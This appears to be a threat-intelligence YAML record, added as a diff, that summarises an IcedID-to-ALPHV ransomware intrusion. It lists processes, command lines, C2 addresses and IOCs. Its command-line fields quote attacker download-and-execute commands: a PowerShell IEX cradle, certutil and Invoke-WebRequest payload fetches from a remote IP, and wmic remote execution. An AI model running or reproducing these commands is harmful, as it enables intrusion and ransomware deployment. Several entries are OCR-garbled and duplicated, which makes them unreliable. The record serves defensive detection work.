@@ -1,0 +1,145 @@
+description: "A multi\u2011stage intrusion began with a spam campaign delivering a\
+  \ forked IcedID loader, followed by deployment of ScreenConnect, Cobalt Strike,\
+  \ CSharp Streamer, and ultimately ALPHV ransomware across the domain."
+attribution: "APT group unknown; likely state\u2011sponsored actor"
+malware_families:
+- IcedID
+- ScreenConnect
+- Cobalt Strike
+- CSharp Streamer
+- ALPHV
+- CobaltStrike
+- Rclone
+- ALPHV Ransomware
+TTPs:
+  processes:
+  - regsvr32.exe
+  - rundll32.exe
+  - cmd.exe
+  - powershell.exe
+  - wmic.exe
+  - cslite.exe
+  - ScreenConnect Client Service
+  - confucius_cpp.exe
+  - netscan.exe
+  commandline:
+  - powershell Invoke-WebRequest "http://temp.sh/VSlAV/http64.exe" -OutFile C:\\programdata\\rr.exe
+  - '''regsvr32.exe'' C:/windows/Temp/0370-1.dll'
+  - '''rundll32.exe'' C:\Users\<user>\AppData\Roaming\<user>\{40502BA4-3D3D-8C90-8C72-2D965AA9FD9BNiwigocacod.dil,#1C:\Users\<user>\AppData\Local\Temp\toovey.exe'
+  - '''cmd.exe'' /c chcp>&2ipconfig /allnet view /all /domainnltest /domain_trustsnet
+    group "Domain Admins" /domainScreenConnectNltest /dclist: CSharp Streamer'
+  - '''powershell.exe'' -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring(''http://85.209.11.48:80/ksaid''))"'
+  - '''powershell'' Invoke-WebReauest ho://temp.sh/VSIAV/htto64.exe -OutFile C:\oroaramdata\rr.exe
+    |certutil -urlcache -split -f hp://85.209.11.48:80/download/csss.exe C:\programdata\cscssss.exe'
+  - '''cmd.exe'' /c wmic /node:REDACTED process call create "C:\setup.exe"'
+  - '''cmd.exe'' /c wmic /node:REDACTED process call create "%ALLUSERSPROFILE%\BNUfUOMFT2.exe
+    p7BQXbycbpiH -QnA -4Nc -gd -A -4heGxsuj -yreVf -91nHs -9eGxd -etRzp6kw -gzfW3"'
+  - '''cmd /c wmic /node:REDACTED process call create "C:\setup.exe"'''
+  powershell:
+  - powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://85.209.11.48:80/ksaid'))"
+  - powershell Invoke-WebReauest ho://temp.sh/VSIAV/htto64.exe -OutFile C:\oroaramdata\rr.exe
+    |certutil -urlcache -split -f hp://85.209.11.48:80/download/csss.exe C:\programdata\cscssss.exe
+  scripting_engine:
+  - WScript.exe
+  - Document[2023.10.11_08-07].vbs
+  registry_keys: []
+  image_load: []
+  network_connections:
+  - process: IcedID loader
+    destination: modalefastnow.com
+    port: 443
+  - process: IcedID second stage DLL
+    destinations:
+    - address: 173.255.204.62
+      port: 443
+      domain: jkbarmossen.com
+    - address: 94.232.46.27
+      port: 443
+      domain: evinakortu.com
+    - address: 94.232.46.27
+      port: 443
+      domain: hofsaalos.com
+    - address: 77.105.140.181
+      port: 443
+      domain: jerryposter.com
+    - address: 77.105.142.135
+      port: 443
+      domain: skrechelres.com
+    - address: 212.18.104.12
+      port: 443
+      domain: modalefastnow.com
+  - process: Cobalt Strike beacon
+    destination: 85.209.11.48
+    port: 80
+  - process: CSharp Streamer
+    destinations:
+    - address: 109.236.80.191
+      ports:
+      - 135
+      - 139
+      - 80
+      - 443
+      - 3389
+  - process: cmd.exe
+    destination: 85.209.11.48
+    port: 80
+  - process: powershell.exe
+    destination: 85.209.11.48
+    port: 80
+  - process: cslite.exe
+    destination: 217.23.12.8
+    port: 22
+  - process: rclone
+    destination: 217.23.12.8
+    port: 22
+  file_activity:
+  - C:\\programdata\\setup.exe
+  - C:\\programdata\\BNUfUOmFT2.exe
+  - '%ALLUSERSPROFILE%\\BNUfUOMFT2.exe p7BQXbycbpiH -QnA -4Nc -gd -A -4heGxsuj -yreVf
+    -91nHs -9eGxd -etRzp6kw -gzfW3'
+  - C:\\Users\\<user>\\AppData\\Roaming\\<user>\\{40502BA4-3D3D-8C90-8C72-2D965AA9FD9BNiwigocacod.dil,#1C:\\Users\\<user>\\AppData\\Local\\Temp\\toovey.exe
+  persistence:
+  - Scheduled task created by IcedID loader (interval PT1H)
+  - "ScreenConnect auto\u2011start service"
+  - Scheduled Task Creation via rundli32.exe
+  - ScreenConnect Client Service
+  process_relations: []
+IOCs:
+  hashes: []
+  ips:
+  - 212.18.104.12
+  - 173.255.204.62
+  - 94.232.46.27
+  - 77.105.140.181
+  - 77.105.142.135
+  - 85.209.11.48
+  - 109.236.80.191
+  - 217.23.12.8
+  - 92.118.112.113
+  domains:
+  - modalefastnow.com
+  - jkbarmossen.com
+  - evinakortu.com
+  - hofsaalos.com
+  - jerryposter.com
+  - skrechelres.com
+  - www.i2rtqyj[.]ekz
+  - modalefastnow[.]com
+  - hofsaalos[.]com
+  - jkbarmossen[.]com
+  - evinakortu[.]com
+  - jerryposter[.]com
+  - skrechelres[.]com
+  urls:
+  - http://85.209.11.48:80/download/test1.exe
+  - http://85.209.11.48:80/download/http64.exe
+  - http://85.209.11.48:80/download/csss.exe
+  - http://85.209.11.48:80/ksajSk
+  - http://85.209.11.48:80/ksaid
+  - http://temp.sh/VSlAV/http64.exe
+authors:
+- '@yatinwad'
+- UC2
+reference: https://thedfirreport.com/2024/06/10/icedid-brings-screenconnect-and-csharp-streamer-to-alphv-ransomware-deployment
+date_of_publication: June 10, 2024
+file_creation_date: October 01, 2025
